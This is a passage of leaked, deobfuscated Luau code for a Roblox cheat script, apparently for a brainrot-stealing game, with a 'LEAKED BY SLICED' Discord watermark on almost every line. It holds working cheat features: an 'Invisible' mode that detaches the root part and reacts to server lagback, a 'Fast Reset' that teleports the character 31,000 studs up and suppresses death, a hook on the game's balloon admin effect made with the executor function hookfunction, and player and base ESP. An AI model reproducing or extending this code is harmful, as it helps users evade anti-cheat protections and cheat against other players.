					humanoidRootPart.CFrame = cFrame
				end

				local humanoid = sliced17:FindFirstChildOfClass("Humanoid")

				if humanoid and hipHeight ~= nil then
					humanoid.HipHeight = hipHeight
				end

				model:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			if not ok and humanoidRootPart and humanoidRootPart.Parent then
				pcall(function()
					humanoidRootPart:Destroy()
				end)
			end

			return ok
		end

		local slicedfn31 = nil

		slicedfn31 = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not flag3 then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 then
				return
			end
			local animation = Instance.new("Animation")
			animation.AnimationId = animationId  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced17 = (humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)):LoadAnimation(animation)
			animation:Destroy()
			sliced13 = sliced17
			sliced17.Priority = Enum.AnimationPriority.Action4
			sliced17:Play(0, 1, 0)

			slicedfn18(sliced17.Stopped:Connect(function()
				if flag3 and sliced13 == sliced17 then
					slicedfn31()
				end
			end))  -- LEAKED BY SLICED | discord.gg/pubmethod

			task.defer(function()
				if flag3 and sliced13 == sliced17 then
					pcall(function()
						sliced17.TimePosition = 0.7
					end)

					task.delay(1, function()
						if flag3 and sliced13 == sliced17 then
							pcall(function()
								sliced17:AdjustSpeed(math.huge)
							end)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end)
				end
			end)
		end

		local flag8 = false

		local function slicedfn32(arg)
			if arg ~= false then
				slicedn7 += 1
				flag8 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			slicedn9 += 1
			slicedn10 += 1
			flag3 = false
			slicedn12 += 1
			sliced15 = nil
			sliced16 = nil
			slicedn13 = 0
			sliced14 = nil

			if sliced13 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				pcall(function()
					sliced13:Stop()
				end)

				pcall(function()
					sliced13:Destroy()
				end)

				sliced13 = nil
			end

			slicedfn17()
			slicedfn30()  -- LEAKED BY SLICED | discord.gg/pubmethod
			clone = nil
			humanoidRootPart = nil
			sliced12 = nil
			hipHeight = nil
		end

		local slicedfn33 = nil

		local function slicedfn34()
			if flag8 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag8 = true
			slicedn7 += 1
			local sliced17 = slicedn7

			task.spawn(function()
				slicedfn32(false)
				local character_ = localPlayer.Character

				if character_ then
					character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
				end

				character_ = character_ and character_.Position or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				local now = os.clock()
				local slicedn15 = 0

				while true do
					if flag and sliced17 == slicedn7 and flag2 and os.clock() - now < 3.5 then
						local result = RunService.Heartbeat:Wait()

						if not (sliced17 ~= slicedn7 or not flag2) then
							local character_2 = localPlayer.Character
							local primaryPart = character_2 and (character_2.PrimaryPart or character_2:FindFirstChild("HumanoidRootPart"))
							character_2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")

							if primaryPart and character_2 and character_2.Health > 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
								local position = primaryPart.Position

								if character_ then
									if (position - character_).Magnitude > 4 then
										slicedn15 = 0
										character_ = position
										continue
									else
										slicedn15 += result
										local slicedn16 = os.clock() - now
										if not (slicedn15 >= 0.6 and slicedn16 >= 0.7) then  -- LEAKED BY SLICED | discord.gg/pubmethod
											character_ = position
											continue
										end
									end
								else
									character_ = position
									continue
								end
							else
								slicedn15 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
								continue
							end
						end
					end

					break
				end

				flag8 = false

				if sliced17 == slicedn7 and flag and flag2 then
					if slicedfn33 then
						slicedfn33()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end
			end)
		end

		slicedfn33 = function()
			if flag3 then
				return true
			end

			if humanoidRootPart or clone or sliced12 then
				slicedfn32()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ or character_.Parent ~= Workspace or not humanoid or humanoid.Health <= 0 or not humanoidRootPart2 or humanoidRootPart2.Parent ~= character_ or character_.PrimaryPart ~= humanoidRootPart2 then
				return false
			end
			slicedn9 += 1
			local sliced17 = slicedn9
			slicedfn17()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn28()
			if not slicedfn29() then
				slicedfn17()
				return false
			end
			flag3 = true
			task.wait(0.1)
			if sliced17 ~= slicedn9 or not flag3 then
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn31()
			slicedfn23()

			slicedfn18(RunService.PreSimulation:Connect(function()
				local character_2 = localPlayer.Character
				local humanoid2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")
				character_2 = character_2 and character_2.PrimaryPart
				if not flag3 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart or not humanoidRootPart.Parent or not character_2 then
					return
				end

				if flag7 and localPlayer:GetAttribute("Stealing") == true then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local now = os.clock()

					if slicedn4 <= now - slicedn13 then
						slicedn13 = now
						slicedfn26(character_2, humanoid2)
					end

					if sliced16 ~= nil then
						slicedn6 = slicedfn27(slicedn6, sliced16, 0.42)
					end

					if createSlider and now >= slicedn14 then
						slicedn14 = now + 0.1  -- LEAKED BY SLICED | discord.gg/pubmethod
						createSlider:Set(math.floor(slicedn6 + 0.5), false)
					end
				else
					sliced15 = nil
					sliced16 = nil
				end

				local cframe = CFrame.Angles
				humanoidRootPart.CFrame = (character_2.CFrame - Vector3.new(0, humanoid2.HipHeight + character_2.Size.Y * 0.5 - 1 + slicedn5, 0)) * cframe(math.rad(slicedn6), 0, 0)
				humanoidRootPart.Velocity = character_2.Velocity
				humanoidRootPart.CanCollide = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end))

			sliced14 = nil

			slicedfn18(RunService.PreAnimation:Connect(function()
				if not flag3 or not humanoidRootPart or not humanoidRootPart.Parent then
					sliced14 = nil
					return
				end
				local position = humanoidRootPart.Position

				if sliced14 then
					local magnitude = (position - sliced14).Magnitude  -- LEAKED BY SLICED | discord.gg/pubmethod
					local now = os.clock()

					if magnitude > slicedn2 and now - slicedn11 > slicedn3 then
						slicedn11 = now

						if flag5 then
							v.Notify("Lagback detected", "Invisible position was corrected by the server.", 5)
						end

						if flag6 then
							slicedfn34()
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				sliced14 = position
			end))

			return true
		end

		local function slicedfn35(arg, arg2)
			slicedn10 += 1
			local sliced17 = slicedn10

			task.spawn(function()
				if arg2 and arg2 > 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					task.wait(arg2)
				end

				for i_ = 1, 50 do
					if not flag or sliced17 ~= slicedn10 or not flag2 or arg ~= localPlayer.Character then
						return
					end
					local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart2 = arg and arg:FindFirstChild("HumanoidRootPart")

					if humanoid and slicedfn19(humanoid) and humanoidRootPart2 and humanoidRootPart2.Parent == arg then
						if slicedfn33() then  -- LEAKED BY SLICED | discord.gg/pubmethod
							return
						end
					end

					task.wait(0.1)
				end
			end)
		end

		local sliced17 = sliced7:CreateToggle({
			Name = "Invisible",
			Default = false,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Keybind = Enum.KeyCode.U,
			Callback = function(arg)
				flag2 = arg == true

				if flag2 then
					slicedfn35(localPlayer.Character, 0.15)
				else
					slicedfn32()
				end
			end,
		})  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn36()
			if not flag4 or not sliced17 then
				return
			end
			local flag9 = localPlayer:GetAttribute("Stealing") == true
			if sliced17:Get() ~= flag9 then
				sliced17:Set(flag9, true)
				return
			end

			if flag9 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag2 = true

				if not flag3 then
					slicedfn35(localPlayer.Character, 0.05)
				end
			elseif flag2 or flag3 or humanoidRootPart ~= nil or clone ~= nil then
				flag2 = false
				slicedfn32()
			end
		end

		sliced7:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Auto Invisible On Steal",
			Default = false,
			Callback = function(arg)
				flag4 = arg == true

				if flag4 then
					slicedfn36()
				end
			end,
		})

		sliced7:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Auto Rotation",
			Default = true,
			Callback = function(arg)
				flag7 = arg == true
				slicedn13 = 0
				slicedfn23()
			end,
		})

		createSlider = sliced7.CreateSlider

		createSlider = createSlider(sliced7, {  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Rotation",
			Min = 180,
			Max = 300,
			Default = 279,
			AllowDecimals = false,
			Increment = 1,
			Callback = function(arg)
				slicedn6 = math.clamp(math.floor((tonumber(arg) or 225) + 0.5), 180, 300)
			end,
		})  -- LEAKED BY SLICED | discord.gg/pubmethod

		sliced7:CreateSlider({
			Name = "Depth",
			Min = 0,
			Max = 0.7,
			Default = 0.12,
			AllowDecimals = true,
			DecimalPlaces = 2,
			Increment = 0.01,
			Callback = function(arg)
				slicedn5 = math.clamp(tonumber(arg) or 0.09, 0, 0.7)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end,
		})

		sliced7:CreateToggle({
			Name = "Lagback Detect",
			Default = true,
			Callback = function(arg)
				flag5 = arg == true
			end,
		})

		sliced7:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Auto Fix Lagback",
			Default = false,
			Callback = function(arg)
				flag6 = arg == true

				if not flag6 then
					slicedn7 += 1
					flag8 = false
				end
			end,
		})  -- LEAKED BY SLICED | discord.gg/pubmethod

		tbl.IsActive = function()
			return flag3 == true
		end

		tbl.GetDrop = function()
			local character_ = sliced12 or localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
			end

			return (humanoid and humanoid.HipHeight and humanoid.HipHeight > 0 and humanoid.HipHeight or 2) + (character_ and character_.Size and character_.Size.Y or 2) * 0.5 - 1 + slicedn5  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		tbl.SuspendForReset = function(arg)
			local sliced18 = sliced12
			local sliced19

			if sliced12 then
				sliced19 = arg
			else
				sliced19 = sliced18
			end

			if sliced19 and arg ~= sliced12 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return false
			end
			local flag9 = flag3 or humanoidRootPart ~= nil or clone ~= nil

			if flag9 then
				slicedfn32()
			end

			return flag9
		end

		tbl.ResumeIfRequested = function(arg)
			if flag2 and arg == localPlayer.Character then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn35(arg, 0.05)
			end
		end

		local connection = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			slicedfn36()
			slicedfn23()
		end)

		local connection2 = localPlayer.CharacterRemoving:Connect(function(character_)
			if character_ == localPlayer.Character or character_ == sliced12 then
				slicedfn32()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end)

		local connection3 = localPlayer.CharacterAdded:Connect(function(character_)
			if sliced12 and sliced12 ~= character_ then
				slicedfn32()
			end

			if flag2 then
				slicedfn35(character_, 0.35)
			end
		end)  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn2(function()
			flag2 = false
			flag4 = false
			flag8 = false
			slicedfn32()
			slicedfn16(connection)
			slicedfn16(connection2)
			slicedfn16(connection3)
			tbl.SuspendForReset = nil
			tbl.ResumeIfRequested = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl.IsActive = nil
			tbl.GetDrop = nil
		end)
	end

	do
		local flag8 = true
		local flag9 = false
		local flag10 = true
		local flag11 = false
		local flag12 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced13 = nil
		local sliced14 = nil
		local flag13 = false
		local tbl4 = {}
		local connection = nil
		local chilliFastResetRuntime = CoreGui:FindFirstChild("__ChilliFastResetRuntime")

		if chilliFastResetRuntime then
			local cleanup = chilliFastResetRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliFastResetRuntime:Destroy()
			end)
		end

		local folder = Instance.new("Folder")
		folder.Name = "__ChilliFastResetRuntime"
		folder.Archivable = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		folder.Parent = CoreGui
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder

		local function slicedfn16()
			for _, sliced15 in ipairs(tbl4) do
				if sliced15.Connected then
					sliced15:Disconnect()
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			table.clear(tbl4)
		end

		local function slicedfn17()
			return localPlayer:GetAttribute("ChilliDropBrainrotActive") == true
		end

		local function slicedfn18(arg, arg2)
			if not flag8 or flag9 then
				return false
			end
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not arg or arg ~= localPlayer.Character or not humanoid or not arg2 and humanoid.Health <= 0 then
				return false
			end
			local flag14 = false

			if type(tbl.SuspendForReset) == "function" then
				local result
				flag14, result = pcall(tbl.SuspendForReset, arg)
				flag14 = flag14 and result == true
			end

			local humanoidRootPart2 = arg:FindFirstChild("HumanoidRootPart")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not humanoidRootPart2 then
				if flag14 and type(tbl.ResumeIfRequested) == "function" then
					tbl.ResumeIfRequested(arg)
				end

				return false
			end

			flag9 = true
			local sliced15 = arg

			task.spawn(function()
				local cFrame = humanoidRootPart2.CFrame  -- LEAKED BY SLICED | discord.gg/pubmethod
				local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
				local assemblyAngularVelocity = humanoidRootPart2.AssemblyAngularVelocity
				local health = humanoid.Health
				local flag15 = true

				pcall(function()
					flag15 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

					if humanoid.Health <= 0 then
						humanoid.Health = math.max(humanoid.MaxHealth, 1)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				local connection2 = humanoid.HealthChanged:Connect(function(health2)
					if flag8 and flag9 and localPlayer.Character == sliced15 and health2 <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end
				end)

				local cFrame2 = cFrame + Vector3.new(0, 31000, 0)

				while flag8 and localPlayer.Character == sliced15 do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame2
						end)
					end

					if humanoid.Parent and humanoid.Health <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					task.wait()
				end

				local flag16 = localPlayer.Character ~= sliced15
				connection2:Disconnect()

				if not flag16 then
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame
							humanoidRootPart2.AssemblyLinearVelocity = assemblyLinearVelocity
							humanoidRootPart2.AssemblyAngularVelocity = assemblyAngularVelocity  -- LEAKED BY SLICED | discord.gg/pubmethod
						end)
					end

					if humanoid.Parent then
						pcall(function()
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag15)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				flag9 = false
			end)

			return true
		end

		local function slicedfn19()
			return slicedfn18(localPlayer.Character, false)
		end

		local function slicedfn20()
			if not flag8 or not flag11 or flag12 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			flag12 = true

			task.spawn(function()
				for i_ = 1, 20 do
					if not (not flag8 or not flag11 or flag9) then
						if not slicedfn18(localPlayer.Character, false) then
							task.wait(0.05)
							continue
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					break
				end

				flag12 = false
			end)
		end

		local function slicedfn21()
			if flag13 and sliced13 and sliced14 and type(hookfunction) == "function" then
				pcall(function()
					hookfunction(sliced13, sliced14)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			flag13 = false
			sliced13 = nil
			sliced14 = nil
		end

		local function slicedfn22()
			if flag13 then
				return true
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if type(hookfunction) ~= "function" then
				return false
			end

			local ok, result = pcall(function()
				return require(ReplicatedStorage.Datas.AdminCommands.balloon).effects.Victim
			end)

			if not ok or type(result) ~= "function" then
				return false
			end
			sliced13 = result  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced15 = nil

			local ok2, result2 = pcall(function()
				return hookfunction(result, function(...)
					local sliced16 = table.pack(sliced15(...))

					if flag8 and flag11 then
						task.defer(slicedfn20)
					end

					return table.unpack(sliced16, 1, sliced16.n)
				end)
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not ok2 or type(result2) ~= "function" then
				sliced13 = nil
				return false
			end
			sliced15 = result2
			sliced14 = result2
			flag13 = true
			return true
		end

		local function slicedfn23(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag11 = arg == true
			flag12 = false

			if flag11 then
				if not slicedfn22() then
					flag11 = false
				end
			else
				slicedfn21()
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn24(arg)
			slicedfn16()
			if not flag8 or not flag10 or not arg then
				return
			end

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
				if not flag8 or not flag10 or not humanoid or arg ~= localPlayer.Character then
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				local flag14 = false
				local flag15 = false

				local function slicedfn25()
					local sliced15 = flag14
					local sliced16

					if flag14 then
						sliced16 = sliced15
					else
						sliced16 = flag15
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if sliced16 or flag9 or arg ~= localPlayer.Character or slicedfn17() then
						return
					end
					flag15 = true
					local rescueSerial = tbl2.RescueSerial

					task.defer(function()
						flag15 = false
						if flag14 or flag9 or arg ~= localPlayer.Character or slicedfn17() or not humanoid.Parent then
							return
						end  -- LEAKED BY SLICED | discord.gg/pubmethod

						if tbl2.ProtectedHumanoid == humanoid and (humanoid.Health > 0 or tbl2.RescueSerial ~= rescueSerial) then
							return
						end

						if humanoid.Health > 0 then
							return
						end
						flag14 = slicedfn18(arg, true) == true
					end)
				end

				tbl4[#tbl4 + 1] = humanoid.HealthChanged:Connect(function(health)  -- LEAKED BY SLICED | discord.gg/pubmethod
					if health <= 0 then
						slicedfn25()
					end
				end)

				tbl4[#tbl4 + 1] = humanoid.Died:Connect(slicedfn25)
			end)
		end

		local function slicedfn25(arg)
			flag10 = arg == true

			if flag10 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn24(localPlayer.Character)
			else
				slicedfn16()
			end
		end

		local function slicedfn26()
			if not flag8 then
				return
			end
			flag8 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag9 = false
			flag10 = false
			flag11 = false
			flag12 = false
			slicedfn16()
			slicedfn21()

			if connection then
				connection:Disconnect()
				connection = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		connection = localPlayer.CharacterAdded:Connect(function(character_)
			flag9 = false

			if flag10 then
				slicedfn24(character_)
			end
		end)

		bindableEvent.Event:Connect(slicedfn26)
		folder.Destroying:Connect(slicedfn26)
		sliced8:CreateButton({ Name = "Fast Reset", ButtonText = "Reset", Callback = slicedfn19 })  -- LEAKED BY SLICED | discord.gg/pubmethod
		sliced8:CreateToggle({ Name = "Auto Fast Reset", Default = true, Callback = slicedfn25 })
		sliced8:CreateToggle({ Name = "Auto Reset Balloon", Default = false, Callback = slicedfn23 })
		slicedfn24(localPlayer.Character)
	end

	local sliced13 = esp:CreateSection({ Name = "Player ESP", Expanded = false })
	sliced9 = esp:CreateSection({ Name = "Brainrot ESP", Expanded = false })
	sliced10 = esp:CreateSection({ Name = "Brainrot Notifications", Expanded = false })
	sliced11 = esp:CreateSection({ Name = "Base ESP", Expanded = false })

	slicedfn4 = function()
		if type(gethui) == "function" then  -- LEAKED BY SLICED | discord.gg/pubmethod
			local ok, result = pcall(gethui)
			if ok and typeof(result) == "Instance" then
				return result
			end
		end

		return CoreGui
	end

	slicedfn5 = function(name)
		local sliced14 = slicedfn4()
		local tbl4 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

		for _, sliced15 in ipairs({ sliced14, CoreGui }) do
			if sliced15 and not tbl4[sliced15] then
				tbl4[sliced15] = true
				local sliced16 = sliced15:FindFirstChild(name)

				if sliced16 then
					local cleanup = sliced16:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					pcall(function()
						sliced16:Destroy()
					end)
				end
			end
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.Archivable = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = sliced14
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = screenGui
		return screenGui, bindableEvent
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	slicedfn6 = function(arg)
		for _, sliced14 in ipairs(arg) do
			if typeof(sliced14) == "RBXScriptConnection" then
				sliced14:Disconnect()
			end
		end

		table.clear(arg)
	end

	slicedfn7 = function()
		local sliced14 = Workspace:FindFirstChild(localPlayer.Name)  -- LEAKED BY SLICED | discord.gg/pubmethod
		if not sliced14 or not sliced14:IsA("Model") then
			return nil
		end
		local humanoidRootPart2 = sliced14:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart2 and humanoidRootPart2:IsA("BasePart") and humanoidRootPart2.Parent == sliced14 then
			return humanoidRootPart2
		end
		local hitbox = sliced14:FindFirstChild("__HITBOX") or sliced14:FindFirstChild("__hitbox") or sliced14:FindFirstChild("Hitbox") or sliced14:FindFirstChild("HitBox")
		if hitbox and hitbox:IsA("BasePart") then
			return hitbox  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
		return nil
	end

	slicedfn8 = function(arg)
		arg = arg and arg:FindFirstChild("PlotSign")
		if not arg then
			return nil
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("TextLabel") then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local str = tostring(descendant.Text or "")
				if str ~= "" and string.lower(str) ~= "your base" and string.find(string.lower(str), "base", 1, true) then
					return descendant
				end
			end
		end

		return nil
	end

	local slicedfn16

	slicedfn16 = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local str = slicedfn8(arg)

		if str then
			str = tostring(str.Text or "")
		end

		str = str or ""
		return str ~= "" and str or "Base"
	end

	slicedfn9 = function(arg)
		local sliced14 = string.lower(slicedfn16(arg))
		return string.find(sliced14, string.lower(localPlayer.Name), 1, true) ~= nil or string.find(sliced14, string.lower(localPlayer.DisplayName), 1, true) ~= nil  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local slicedfn17
	local slicedn8 = 12

	slicedfn17 = function(arg)
		if not arg then
			return nil
		end
		local animalPodiums = arg:FindFirstChild("AnimalPodiums")
		local huge = math.huge
		local slicedn9 = -math.huge  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn10 = -math.huge
		local huge2 = math.huge
		local huge3 = math.huge

		if animalPodiums then
			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local position = base.Position
					huge3 = math.min(huge3, position.X)  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn10 = math.max(slicedn10, position.X)
					huge = math.min(huge, position.Z)
					slicedn9 = math.max(slicedn9, position.Z)
					huge2 = math.min(huge2, position.Y)
				end
			end
		end

		local stealHitbox = arg:FindFirstChild("StealHitbox")
		local x, z

		if stealHitbox and stealHitbox:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
			x = stealHitbox.Position.X
			z = stealHitbox.Position.Z

			if huge2 == math.huge then
				huge2 = stealHitbox.Position.Y - stealHitbox.Size.Y * 0.5
			end
		elseif huge3 ~= math.huge then
			x = (huge3 + slicedn10) * 0.5
			z = (huge + slicedn9) * 0.5
		else
			local mainRoot = arg:FindFirstChild("MainRoot")  -- LEAKED BY SLICED | discord.gg/pubmethod
			local isBasePart = mainRoot and mainRoot:IsA("BasePart")
			z = nil
			x = nil

			if isBasePart then
				x = mainRoot.Position.X
				z = mainRoot.Position.Z
				huge2 = mainRoot.Position.Y
			end
		end

		if not x or huge2 == math.huge then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return nil
		end
		return Vector3.new(x, huge2 + slicedn8, z)
	end

	local slicedfn18

	slicedfn18 = function(arg)
		return arg and arg:IsA("BasePart") and (arg.Name == "PlotSign" or arg.Name == "MainRoot" or arg.Name == "Spawn")
	end

	tbl3 = { YourBaseClear = false, ClearBaseTransparency = 0.8 }
	local tbl4 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

	slicedfn10 = function(arg)
		tbl4[#tbl4 + 1] = arg
	end

	slicedfn11 = function(arg, arg2)
		if tbl3[arg] == arg2 then
			return
		end
		tbl3[arg] = arg2

		for _, sliced14 in ipairs(tbl4) do
			pcall(sliced14, arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
	end

	do
		local sliced14 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Index)
		end)

		if ok and type(result) == "table" then
			sliced14 = result
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn12 = function(arg)
			local tbl5 = {}
			local sliced15 = sliced14 and sliced14[arg]
			if not sliced15 then
				return tbl5
			end

			if type(sliced15.BaseColors) == "table" then
				for _, baseColor in pairs(sliced15.BaseColors) do
					if typeof(baseColor) == "Color3" then
						tbl5[#tbl5 + 1] = baseColor  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end
			end

			if #tbl5 == 0 and typeof(sliced15.MainColor) == "Color3" then
				tbl5[#tbl5 + 1] = sliced15.MainColor
			end

			return tbl5
		end
	end

	local slicedn9 = 5  -- LEAKED BY SLICED | discord.gg/pubmethod
	local slicedn10 = 12
	local slicedn11 = 4.5
	local tbl5 = { "HumanoidRootPart", "LowerTorso", "UpperTorso", "Torso", "Head" }
	local font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
	local slicedn12 = 0.25
	local transparency = 0
	local tbl6

	tbl6 = {
		Head = true,
		Torso = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
		UpperTorso = true,
		LowerTorso = true,
		["Left Arm"] = true,
		["Right Arm"] = true,
		["Left Leg"] = true,
		["Right Leg"] = true,
		LeftUpperArm = true,
		LeftLowerArm = true,
		LeftHand = true,
		RightUpperArm = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
		RightLowerArm = true,
		RightHand = true,
		LeftUpperLeg = true,
		LeftLowerLeg = true,
		LeftFoot = true,
		RightUpperLeg = true,
		RightLowerLeg = true,
		RightFoot = true,
	}

	local font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)  -- LEAKED BY SLICED | discord.gg/pubmethod
	local sliced14

	do
		local colorSequence = ColorSequence.new
		local tbl7 = {}
		local sliced15 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
		local sliced16 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl7[1] = sliced15
		tbl7[2] = sliced16  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(new(1, color(210, 135, 255)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		sliced14 = colorSequence(tbl7)
	end

	local colorSequence

	do
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB  -- LEAKED BY SLICED | discord.gg/pubmethod
		colorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)), new(1, color(35, 17, 79)) })
	end

	local sliced15

	do
		local colorSequence2 = ColorSequence.new
		local tbl7 = {}
		local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local sliced17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB  -- LEAKED BY SLICED | discord.gg/pubmethod
		tbl7[1] = sliced16
		tbl7[2] = sliced17

		do
			local values = table.pack(new(1, color(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		sliced15 = colorSequence2(tbl7)
	end

	local sliced16

	do  -- LEAKED BY SLICED | discord.gg/pubmethod
		local colorSequence2 = ColorSequence.new
		local tbl7 = {}
		local sliced17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local sliced18 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		local new = ColorSequenceKeypoint.new
